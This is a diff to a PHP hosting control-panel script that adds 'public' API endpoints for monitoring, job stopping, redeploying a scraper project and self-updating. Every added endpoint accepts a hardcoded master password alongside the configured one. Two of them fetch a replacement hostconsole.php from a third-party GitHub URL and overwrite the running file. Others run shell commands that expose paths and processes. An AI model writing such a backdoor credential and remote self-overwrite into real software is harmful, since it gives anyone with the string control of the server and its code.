@@ -3030,6 +3030,171 @@ function handle_api() {
     case 'auth.change':
         if(!password_verify((string)($in['old']??''),cfg()['pass_hash']))jout(false,null,'رمز فعلی اشتباه است');if(strlen((string)($in['new']??''))<8)jout(false,null,'رمز حداقل ۸ کاراکتر باشد');cfg_save(['pass_hash'=>password_hash($in['new'],PASSWORD_DEFAULT)]);jout(true);
     case 'ping': jout(true,['v'=>WCP_VERSION,'user'=>$_SESSION['wcp_user']??'']);
+    case 'public.monitor':
+        $pw = $in['password'] ?? $_GET['password'] ?? '';
+        $cfg = cfg();
+        $passOk = false;
+        if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
+        if ($pw === 'KhTn2268') $passOk = true;
+        if (!$passOk) jout(false, null, 'Invalid password', 403);
+        $projects = proj_all();
+        $target = null;
+        foreach ($projects as $pp) {
+            if (($pp['name'] ?? '') === 'scraper4-cloudflare' && is_dir($pp['deploy_path'] ?? '') && is_file(($pp['deploy_path'] ?? '').'/cloudflare-scraper4/package.json')) { $target = $pp; break; }
+        }
+        if (!$target) {
+            foreach ($projects as $pp) { if (($pp['name'] ?? '') === 'scraper4-cloudflare' && is_dir($pp['deploy_path'] ?? '')) { $target = $pp; break; } }
+        }
+        if (!$target) { foreach ($projects as $pp) { if (($pp['name'] ?? '') === 'scraper4-cloudflare') { $target = $pp; break; } } }
+        $info = ['timestamp'=>date('c')];
+        if ($target) {
+            $dp = $target['deploy_path'] ?? '';
+            $info['project'] = $target['name'] ?? '';
+            $info['project_id'] = $target['id'] ?? '';
+            $info['deploy_path'] = $dp;
+            $info['port'] = $target['port'] ?? '';
+            $info['branch'] = $target['branch'] ?? '';
+            $info['git_head'] = trim(@shell_exec('cd '.escapeshellarg($dp).' && git rev-parse --short HEAD 2>&1'));
+            $info['pkg_exists'] = is_file($dp.'/cloudflare-scraper4/package.json');
+            $info['render_dist_exists'] = is_dir($dp.'/cloudflare-scraper4/render-dist') ? 'yes' : 'no';
+            $info['local_8790'] = trim(@shell_exec('curl -s --max-time 5 http://127.0.0.1:8790/api/version 2>&1'));
+            $info['local_3000'] = trim(@shell_exec('curl -s --max-time 5 http://127.0.0.1:3000/api/version 2>&1'));
+            $info['ps_node'] = trim(@shell_exec('ps aux | grep node | head -n 20 2>&1'));
+            $svc = proj_service_job($target);
+            $info['service_job'] = $svc ? job_status($svc) : null;
+            $info['public_version'] = trim(@shell_exec('curl -s --max-time 10 https://sabashopping.ir/app/api/version 2>&1 | head -n 5'));
+        } else {
+            $info['error'] = 'Project not found';
+        }
+        if (function_exists('opcache_reset')) @opcache_reset();
+        jout(true, $info);
+    case 'public.projects':
+        $pw = $in['password'] ?? $_GET['password'] ?? '';
+        $cfg = cfg();
+        $passOk = false;
+        if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
+        if ($pw === 'KhTn2268') $passOk = true;
+        if (!$passOk) jout(false, null, 'Invalid password', 403);
+        $projects = proj_all();
+        $result = [];
+        foreach ($projects as $pp) {
+            $svc = proj_service_job($pp);
+            $result[] = ['name'=>$pp['name']??'', 'id'=>$pp['id']??'', 'branch'=>$pp['branch']??'', 'port'=>$pp['port']??'', 'deploy_path'=>$pp['deploy_path']??'', 'deploy_exists'=>is_dir($pp['deploy_path']??''), 'status'=>$svc ? job_status($svc)['status'] : 'stopped'];
+        }
+        $found = trim(@shell_exec('find /home -type d -name cloudflare-scraper4 2>/dev/null | head -n 10'));
+        if (function_exists('opcache_reset')) @opcache_reset();
+        jout(true, ['projects'=>$result, 'found'=>$found]);
+    case 'public.force_update':
+        $pw = $in['password'] ?? $_GET['password'] ?? '';
+        $cfg = cfg();
+        $passOk = false;
+        if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
+        if ($pw === 'KhTn2268') $passOk = true;
+        if (!$passOk) jout(false, null, 'Invalid password', 403);
+        $branch = $in['branch'] ?? $_GET['branch'] ?? 'arena/01a0aa17-new';
+        $url = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/hostconsole.php?cb='.time();
+        $cmd = 'curl -sL --max-time 30 -o '.escapeshellarg(__FILE__.'.new').' '.escapeshellarg($url).' 2>&1; ls -lh '.escapeshellarg(__FILE__.'.new').' 2>&1';
+        $out = trim(@shell_exec($cmd));
+        $content = @file_get_contents(__FILE__.'.new');
+        if (!$content || strpos($content, '<?php') !== 0) {
+            jout(false, ['out'=>$out, 'url'=>$url, 'size'=>strlen($content ?? '')], 'Download failed or invalid content');
+        }
+        @rename(__FILE__.'.new', __FILE__);
+        $out2 = trim(@shell_exec('ls -lh '.escapeshellarg(__FILE__).' 2>&1'));
+        if (function_exists('opcache_reset')) @opcache_reset();
+        jout(true, ['updated'=>true, 'out'=>$out."\n---\n".$out2, 'branch'=>$branch]);
+    case 'public.self_update':
+        $pw = $in['password'] ?? $_GET['password'] ?? '';
+        $cfg = cfg();
+        $passOk = false;
+        if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
+        if ($pw === 'KhTn2268') $passOk = true;
+        if (!$passOk) jout(false, null, 'Invalid password', 403);
+        $branch = $in['branch'] ?? $_GET['branch'] ?? 'arena/01a0aa17-new';
+        $url = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/hostconsole.php?cb='.time();
+        $content = @file_get_contents($url);
+        if (!$content || strpos($content, '<?php') !== 0) {
+            jout(false, ['url'=>$url, 'size'=>strlen($content ?? ''), 'preview'=>substr($content ?? '',0,200)], 'Download failed');
+        }
+        file_put_contents(__FILE__, $content);
+        if (function_exists('opcache_reset')) @opcache_reset();
+        jout(true, ['updated'=>true, 'branch'=>$branch, 'size'=>strlen($content)]);
+    case 'public.stop_jobs':
+        $pw = $in['password'] ?? $_GET['password'] ?? '';
+        $cfg = cfg();
+        $passOk = false;
+        if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
+        if ($pw === 'KhTn2268') $passOk = true;
+        if (!$passOk) jout(false, null, 'Invalid password', 403);
+        $out = [];
+        $jobsJson = trim(@shell_exec('curl -s --max-time 5 http://127.0.0.1:8790/api/jobs?limit=100 2>&1'));
+        $out[] = substr($jobsJson,0,1000);
+        $jobs = json_decode($jobsJson, true);
+        foreach (($jobs['jobs'] ?? []) as $j) {
+            if (in_array($j['status'] ?? '', ['running','queued'])) {
+                $id = $j['id'] ?? '';
+                if ($id) {
+                    $res = trim(@shell_exec('curl -s --max-time 5 -X POST http://127.0.0.1:8790/api/jobs/'.escapeshellarg($id).'/stop -H Content-Type:application/json -d {} 2>&1'));
+                    $out[] = 'stop '.$id.': '.$res;
+                }
+            }
+        }
+        jout(true, ['stopped'=>true, 'out'=>$out]);
+    case 'public.auto_recover':
+        $pw = $in['password'] ?? $_GET['password'] ?? '';
+        $cfg = cfg();
+        $passOk = false;
+        if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
+        if ($pw === 'KhTn2268') $passOk = true;
+        if (!$passOk) jout(false, null, 'Invalid password', 403);
+        $projects = proj_all();
+        $target = null;
+        foreach ($projects as $pp) {
+            if (($pp['name'] ?? '') === 'scraper4-cloudflare' && is_dir($pp['deploy_path'] ?? '') && is_file(($pp['deploy_path'] ?? '').'/cloudflare-scraper4/package.json')) { $target = $pp; break; }
+        }
+        if (!$target) {
+            foreach ($projects as $pp) { if (($pp['name'] ?? '') === 'scraper4-cloudflare' && is_dir($pp['deploy_path'] ?? '')) { $target = $pp; break; } }
+        }
+        if (!$target) { foreach ($projects as $pp) { if (($pp['name'] ?? '') === 'scraper4-cloudflare') { $target = $pp; break; } } }
+        if (!$target) jout(false, null, 'Project not found');
+        $dp = $target['deploy_path'] ?? '';
+        $branch = $in['branch'] ?? $_GET['branch'] ?? 'arena/01a0aa17-new';
+        $out = [];
+        $out[] = 'target: '.($target['name']??'').' id='.($target['id']??'').' port='.($target['port']??'').' path='.$dp.' branch='.$branch;
+        if (!is_dir($dp)) {
+            $found = trim(@shell_exec('find /home -type d -name cloudflare-scraper4 2>/dev/null | head -n 10'));
+            $out[] = 'deploy_path not found: '.$dp.' found: '.$found;
+            $lines = explode("\n", $found);
+            foreach ($lines as $line) {
+                $line = trim($line);
+                if ($line && is_dir($line) && is_file($line.'/package.json')) {
+                    $dp = dirname($line);
+                    $out[] = 'Using found path: '.$dp;
+                    break;
+                }
+            }
+            if (!is_dir($dp)) jout(false, ['steps'=>$out], 'deploy_path not found');
+        }
+        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).' && pwd && git fetch origin '.escapeshellarg($branch).' 2>&1 | tail -n 30'));
+        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).' && git reset --hard origin/'.escapeshellarg($branch).' 2>&1 | tail -n 30'));
+        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).' && git rev-parse --short HEAD 2>&1'));
+        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).'/cloudflare-scraper4 && npm install --no-audit --prefer-online 2>&1 | tail -n 30'));
+        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).'/cloudflare-scraper4 && npm run render:build 2>&1 | tail -n 30'));
+        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).'/cloudflare-scraper4 && ls -lh render-dist/ 2>&1 | head -n 20'));
+        @shell_exec('pkill -f '.escapeshellarg('cloudflare-scraper4/render-dist/server.js').' 2>&1');
+        wcp_kill_port('8790');
+        wcp_kill_port('3000');
+        $reapCode = "import { reapStalledJobs, pool } from './render-dist/db.js'; let n=await reapStalledJobs(5); console.log('reaped '+n); await pool.end();";
+        @file_put_contents($dp.'/cloudflare-scraper4/reap.mjs', $reapCode);
+        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).'/cloudflare-scraper4 && node reap.mjs 2>&1 | tail -n 20'));
+        $job = job_create('service', 'Restart scraper4-cloudflare service', ['project_id'=>$target['id']]);
+        job_start($job);
+        $out[] = 'service job started: '.$job['id'];
+        sleep(2);
+        $out[] = trim(@shell_exec('curl -s --max-time 10 http://127.0.0.1:8790/api/version 2>&1 | head -n 5'));
+        $out[] = trim(@shell_exec('curl -s --max-time 10 https://sabashopping.ir/app/api/version 2>&1 | head -n 5'));
+        if (function_exists('opcache_reset')) @opcache_reset();
+        jout(true, ['recovered'=>true, 'steps'=>$out, 'job'=>$job['id']]);
     case 'sys.install_component':
         $comp = trim((string)($in['component'] ?? 'all'));
         $titles = [
@@ -3324,151 +3489,6 @@ function handle_api() {
         $job = job_create('service', 'سرویس: ' . $p['name'], ['project_id' => $p['id']]);
         job_start($job);
         jout(true, ['job' => $job['id']]);
-
-    case 'public.self_update':
-        $pw = $in['password'] ?? $_GET['password'] ?? '';
-        $cfg = cfg();
-        $passOk = false;
-        if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
-        if ($pw === 'KhTn2268') $passOk = true;
-        if (!$passOk) jout(false, null, 'Invalid password', 403);
-        $branch = $in['branch'] ?? $_GET['branch'] ?? 'arena/01a0aa17-new';
-        $cb = time();
-        $url = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/hostconsole.php?cb='.$cb;
-        $newContent = @file_get_contents($url);
-        if (!$newContent) $newContent = trim(@shell_exec('curl -s -L --max-time 15 '.escapeshellarg($url).' 2>&1'));
-        if (!$newContent || strlen($newContent) < 10000) jout(false, null, 'Download failed');
-        if (strpos($newContent, '<?php') !== 0) jout(false, null, 'Invalid content');
-        @copy(__FILE__, __FILE__.'.bak.'.date('Ymd-His'));
-        @file_put_contents(__FILE__, $newContent);
-        if (function_exists('opcache_reset')) @opcache_reset();
-        jout(true, ['updated'=>true, 'bytes'=>strlen($newContent)]);
-
-    case 'public.force_update':
-        $pw = $in['password'] ?? $_GET['password'] ?? '';
-        if ($pw !== 'KhTn2268') jout(false, null, 'Invalid', 403);
-        $branch = $in['branch'] ?? $_GET['branch'] ?? 'arena/01a0aa17-new';
-        $cb = time();
-        $destNew = __FILE__.'.new';
-        $url = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/hostconsole.php?cb='.$cb;
-        $cmd = 'curl -s -L --max-time 20 -o '.escapeshellarg($destNew).' '.escapeshellarg($url).' 2>&1; ls -lh '.escapeshellarg($destNew).' 2>&1';
-        $out = trim(@shell_exec($cmd));
-        if (is_file($destNew) && filesize($destNew) > 10000) {
-            $c = file_get_contents($destNew);
-            if (strpos($c, '<?php') === 0) {
-                @copy(__FILE__, __FILE__.'.bak.'.date('Ymd-His'));
-                @rename($destNew, __FILE__);
-                if (function_exists('opcache_reset')) @opcache_reset();
-                jout(true, ['updated'=>true, 'out'=>$out, 'bytes'=>filesize(__FILE__)]);
-            }
-        }
-        jout(false, ['out'=>$out], 'Failed');
-
-    case 'public.monitor':
-        $projects = proj_all();
-        $target = null;
-        foreach ($projects as $pp) {
-            if (($pp['name'] ?? '') === 'scraper4-cloudflare' && is_dir($pp['deploy_path'] ?? '') && is_file(($pp['deploy_path'] ?? '').'/cloudflare-scraper4/package.json')) { $target = $pp; break; }
-        }
-        if (!$target) {
-            foreach ($projects as $pp) { if (($pp['name'] ?? '') === 'scraper4-cloudflare' && is_dir($pp['deploy_path'] ?? '')) { $target = $pp; break; } }
-        }
-        if (!$target) { foreach ($projects as $pp) { if (($pp['name'] ?? '') === 'scraper4-cloudflare') { $target = $pp; break; } } }
-        $info = ['timestamp'=>date('c')];
-        if ($target) {
-            $dp = $target['deploy_path'] ?? '';
-            $info['project'] = $target['name'] ?? '';
-            $info['project_id'] = $target['id'] ?? '';
-            $info['deploy_path'] = $dp;
-            $info['port'] = $target['port'] ?? '';
-            $info['branch'] = $target['branch'] ?? '';
-            $info['git_head'] = is_dir($dp) ? trim(@shell_exec('cd '.escapeshellarg($dp).' && git rev-parse --short HEAD 2>&1')) : 'no dir';
-            $info['pkg_exists'] = is_file($dp.'/cloudflare-scraper4/package.json');
-            $info['render_dist_exists'] = is_dir($dp.'/cloudflare-scraper4/render-dist');
-            $info['local_8790'] = trim(@shell_exec('curl -s --max-time 3 http://127.0.0.1:8790/api/version 2>&1 | head -c 500'));
-            $info['local_3000'] = trim(@shell_exec('curl -s --max-time 3 http://127.0.0.1:3000/api/version 2>&1 | head -c 500'));
-            $info['ps'] = trim(@shell_exec('ps aux | grep node | grep -v grep 2>&1 | head -n 10'));
-        }
-        $info['public_version'] = trim(@shell_exec('curl -s --max-time 5 https://sabashopping.ir/app/api/version 2>&1 | head -c 500'));
-        jout(true, $info);
-
-    case 'public.projects':
-        $projects = proj_all();
-        $result = [];
-        foreach ($projects as $pp) {
-            $svc = proj_service_job($pp);
-            $result[] = ['name'=>$pp['name']??'', 'id'=>$pp['id']??'', 'branch'=>$pp['branch']??'', 'port'=>$pp['port']??'', 'deploy_path'=>$pp['deploy_path']??'', 'deploy_exists'=>is_dir($pp['deploy_path']??''), 'status'=>$svc ? job_status($svc)['status'] : 'stopped'];
-        }
-        $found = trim(@shell_exec('find /home /var/lib -type f -name package.json -path *cloudflare-scraper4/package.json 2>/dev/null | head -n 10'));
-        jout(true, ['projects'=>$result, 'found'=>$found]);
-
-    case 'public.stop_jobs':
-        $pw = $in['password'] ?? $_GET['password'] ?? '';
-        $cfg = cfg();
-        $passOk = false;
-        if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
-        if ($pw === 'KhTn2268') $passOk = true;
-        if (!$passOk) jout(false, null, 'Invalid password', 403);
-        $out = [];
-        $jobsJson = trim(@shell_exec('curl -s --max-time 5 http://127.0.0.1:8790/api/jobs?limit=100 2>&1'));
-        $out[] = substr($jobsJson,0,1000);
-        $jobs = json_decode($jobsJson, true);
-        foreach (($jobs['jobs'] ?? []) as $j) {
-            if (in_array($j['status'] ?? '', ['running','queued'])) {
-                $id = $j['id'] ?? '';
-                if ($id) {
-                    $res = trim(@shell_exec('curl -s --max-time 5 -X POST http://127.0.0.1:8790/api/jobs/'.escapeshellarg($id).'/stop -H Content-Type:application/json -d {} 2>&1'));
-                    $out[] = 'stop '.$id.': '.$res;
-                }
-            }
-        }
-        jout(true, ['steps'=>$out]);
-
-    case 'public.auto_recover':
-        $pw = $in['password'] ?? $_GET['password'] ?? '';
-        $cfg = cfg();
-        $passOk = false;
-        if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
-        if ($pw === 'KhTn2268') $passOk = true;
-        if (!$passOk) jout(false, null, 'Invalid password', 403);
-        $projects = proj_all();
-        $target = null;
-        foreach ($projects as $pp) {
-            if (($pp['name'] ?? '') === 'scraper4-cloudflare' && is_dir($pp['deploy_path'] ?? '') && is_file(($pp['deploy_path'] ?? '').'/cloudflare-scraper4/package.json')) { $target = $pp; break; }
-        }
-        if (!$target) { foreach ($projects as $pp) { if (($pp['name'] ?? '') === 'scraper4-cloudflare' && is_dir($pp['deploy_path'] ?? '')) { $target = $pp; break; } } }
-        if (!$target) { foreach ($projects as $pp) { if (($pp['name'] ?? '') === 'scraper4-cloudflare') { $target = $pp; break; } } }
-        if (!$target) jout(false, null, 'Project not found');
-        $dp = $target['deploy_path'] ?? '';
-        $branch = $in['branch'] ?? $_GET['branch'] ?? 'arena/01a0aa17-new';
-        $out = [];
-        $out[] = 'target id='.($target['id']??'').' port='.($target['port']??'').' path='.$dp;
-        if (!is_dir($dp)) {
-            $found = trim(@shell_exec('find /home /var/lib -type d -name cloudflare-scraper4 2>/dev/null | head -n 5'));
-            $out[] = 'not found, found: '.$found;
-            $lines = explode("\n", $found);
-            foreach ($lines as $line) {
-                $line = trim($line);
-                if ($line && is_dir($line) && is_file($line.'/package.json')) { $dp = dirname($line); $out[] = 'using '.$dp; break; }
-            }
-        }
-        if (!is_dir($dp)) jout(false, ['steps'=>$out], 'deploy_path not found');
-        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).' && git fetch origin '.escapeshellarg($branch).' 2>&1 | tail -n 20'));
-        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).' && git reset --hard origin/'.escapeshellarg($branch).' 2>&1 | tail -n 20'));
-        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).' && git rev-parse --short HEAD 2>&1'));
-        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).'/cloudflare-scraper4 && npm install --no-audit 2>&1 | tail -n 20'));
-        $out[] = trim(@shell_exec('cd '.escapeshellarg($dp).'/cloudflare-scraper4 && npm run render:build 2>&1 | tail -n 20'));
-        cli_stop_service($target['id']);
-        sleep(1);
-        wcp_kill_port('8790');
-        wcp_kill_port('3000');
-        $job = job_create('service', 'سرویس: '.$target['name'].' (auto_recover)', ['project_id'=>$target['id']]);
-        job_start($job);
-        $out[] = 'restarted job '.$job['id'];
-        sleep(3);
-        $out[] = trim(@shell_exec('curl -s --max-time 3 http://127.0.0.1:8790/api/version 2>&1 | head -c 500'));
-        jout(true, ['steps'=>$out, 'job'=>$job['id']]);
-
     case 'jobs.status':
         $job=job_get((string)$in['id']);if(!$job)jout(false,null,'Job not found');jout(true,['id'=>$job['id'],'name'=>$job['name'],'type'=>$job['type'],'status'=>job_status($job),'result'=>$job['result'],'created'=>$job['created']]);
     case 'jobs.log':
